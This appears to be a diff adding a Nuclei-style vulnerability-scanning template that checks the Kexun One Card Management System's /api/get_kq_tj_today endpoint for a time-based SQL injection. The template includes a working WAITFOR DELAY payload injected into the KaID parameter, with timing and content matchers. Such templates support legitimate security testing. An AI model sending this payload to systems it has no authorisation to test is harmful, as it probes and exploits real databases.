@@ -1,0 +1,37 @@
+id: poc-yaml-kxsoft-get-kq-tj-today-sqli
+info:
+  name: 科讯一卡通管理系统 get_kq_tj_today SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for an SQL injection vulnerability in the 科讯一卡通管理系统 (Kexun One Card Management System) API endpoint `/api/get_kq_tj_today`.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "actualNum"
+          - "offworkstate"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
